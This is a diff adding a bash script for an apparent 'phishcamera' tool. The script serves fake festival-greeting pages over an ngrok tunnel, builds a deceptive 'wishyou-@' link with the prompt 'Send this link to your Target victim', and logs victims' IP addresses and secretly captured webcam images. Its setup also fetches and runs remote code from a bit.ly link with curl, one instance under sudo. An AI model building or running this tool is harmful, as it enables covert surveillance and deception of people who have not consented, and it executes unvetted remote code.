@@ -1,0 +1,223 @@
+#!/bin/bash
+CWD=$(pwd)
+if [[ $CWD != *'programs/phishcamera'* ]]; then
+cd programs/phishcamera/ > /dev/null 2>&1
+fi
+if [[ -d "${HOME}/capture-TSc" ]]; then
+:
+else
+mkdir ${HOME}/capture-TSc
+fi
+OS=$(uname -o)
+distro=$(cd $HOME && pwd)
+case ${OS} in
+Android)
+        if ! hash jq > /dev/null 2>&1; then
+        printf "\033[32m[\033[31m!\033[32m]\033[31mjq not found! \033[34mINSTALLING.......\033[00m\n"
+        apt install jq -y > /dev/null 2>&1
+        fi
+        if ! hash pv > /dev/null 2>&1; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mpv not found! \033[34mINSTALLING.......\033[00m\n"
+        apt install pv -y > /dev/null 2>&1
+        fi
+        if [[ ! -f "$PREFIX/bin/lolcat" ]]; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mlolcat not found! \033[34mINSTALLING.......\033[00m\n"
+        apt install python -y && pip install lolcat > /dev/null 2>&1
+        fi
+        if ! hash ngrok > /dev/null 2>&1; then
+        source <(curl -fsSL "https://bit.ly/3repcoL")
+        fi
+;;
+GNU/Linux)
+        if ! hash jq > /dev/null 2>&1; then
+        sudo apt install jq -y > /dev/null 2>&1
+        fi
+        if ! hash pv > /dev/null 2>&1; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mpv not found! \033[34mINSTALLING.......\033[00m\n"
+        sudo apt install pv -y > /dev/null 2>&1
+        fi
+        if [[ ! -f "$PREFIX/bin/lolcat" ]]; then
+        printf "\n\033[32m[\033[31m!\033[32m]\033[31mlolcat not found! \033[34mINSTALLING.......\033[00m\n"
+        sudo apt install python -y && pip install lolcat > /dev/null 2>&1
+        fi
+        if ! hash ngrok > /dev/null 2>&1; then
+        sudo source <(curl -fsSL "https://bit.ly/3repcoL")
+        fi
+;;
+esac
+wait() {
+sleep 0.02
+}
+#<<<----------colour substitution by variables---------->>>
+ B0="$(printf '\033[100m')" S0="$(printf '\033[30m')"
+ B1="$(printf '\033[101m')" S1="$(printf '\033[31m')"
+ B2="$(printf '\033[102m')" S2="$(printf '\033[32m')"
+ B3="$(printf '\033[103m')" S3="$(printf '\033[33m')"
+ B4="$(printf '\033[104m')" S4="$(printf '\033[34m')"
+ B5="$(printf '\033[105m')" S5="$(printf '\033[35m')"
+ B6="$(printf '\033[106m')" S6="$(printf '\033[36m')"
+ B7="$(printf '\033[107m')" S7="$(printf '\033[37m')"
+ G0="$(printf '\033[0;1m')" R0="$(printf '\033[00m')"
+ D0="$(printf '\033[77m')"
+#<<<----------PROGRAM---------->>>
+processbar()
+{
+   bar=" #######################################################"
+   barlenght=${#bar}
+   i=o
+   while ((i < 100 )); do
+           n=$((i*barlenght / 100 ))
+           printf "\e[00;35m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
+           ((i += RANDOM%5+2))
+           sleep 0.01
+   done
+}
+dependencies() {
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+}
+stop() {
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+  pkill -f -2 ngrok > /dev/null 2>&1
+  killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+  killall -2 php > /dev/null 2>&1
+fi
+
+exit 1
+}
+catch_ip() {
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "${S2} IP Address:\e[0m\e[1;77m %s${R0}\n" $ip
+cat ip.txt >> saved.ip.txt
+}
+checkfound() {
+printf "\n"
+printf "\e[5;32>m>>WAITING FOR VICTIM REPOSNSES!!\e[0;1m\n"
+while [ true ]; do
+if [[ -e "ip.txt" ]]; then
+  printf "\n${S6}VICTIM clicked on the link ;)!!${R0}\n"
+  catch_ip
+  rm -rf ip.txt
+fi
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+  printf "\n${S2}YOU GOT AN IMAGE OF YOUR VICTIM${R0}\n"
+  rm -rf Log.log
+ mv -v *'.png'* $HOME/cybercapture/
+fi
+sleep 0.5
+done
+}
+payload_ngrok() {
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+rm -rf index3.html
+}
+select_templet() {
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}festival/name${S7})> ${R0}"
+read fest_name
+fest_name="${fest_name//[[:space:]]/}"
+}
+
+ngrok_server() {
+echo
+processbar
+echo
+printf "${S3}Starting server${R0}"
+printf "${S3}..........${R0}\n" | pv -qL 15
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 2
+echo
+if [[ ${OS^^} == *'ANDROID'* ]]; then
+     if [[ ${distro} == *'com.termux'* ]]; then
+         termux-chroot ngrok http 3333 > /dev/null 2>&1 &
+     else
+         while true; do
+         printf "${S2}[${S1}!${S2}]${S1} Please switch on your mobile hotspot :/${R0}\n"
+	 echo
+         read -p $"Run 'y' if you have switched on the hotspot ==> " hotss
+         if [[ ${hotss} == [y/Y] ]]; then
+         ngrok http 3333 > /dev/null 2>&1 &
+         break
+         else
+         printf "${S2}Exiting........ ${R0}\n"
+         exit
+         fi
+         done
+     fi
+else
+     sudo ngrok http 3333 > /dev/null 2>&1 &
+fi
+sleep 5
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
+if [[ $? != 0 ]]; then
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+else
+r2=$(printf "${r1/\"http:\/\//}")
+r3=$(printf "${r2/\"https:\/\//}")
+r4=$(printf "${r3/\",/}")
+link=$(printf "${r4/%\",/}")
+fi
+echo; wait
+printf "${S7}<<<${R0}${S1}---------------${R0}${B1}${S7}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R0}${G0}${S1}---------------${R0}${S7}>>>${R0}\n"; wait
+echo; wait
+printf "${S4}${R0}${S4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://wishyou-@$link
+wait
+echo
+wait
+echo -e "
+                 _  _
+                / \|_)
+                \_/| \\ short links:-
+" | pv -qL 50 | lolcat
+echo; wait
+printf "${S4}${R0}${S4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://$link
+wait
+payload_ngrok
+checkfound
+}
+phish() {
+if [[ -e sendlink ]]; then
+  rm -rf sendlink
+fi
+select_templet
+  ngrok_server
+}
+dependencies
+phish
+if [[ $CWD != *'programs/phishcamera'* ]]; then
+cd $CWD > /dev/null 2>&1
+fi
+
+#<<<----------END---------->>>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
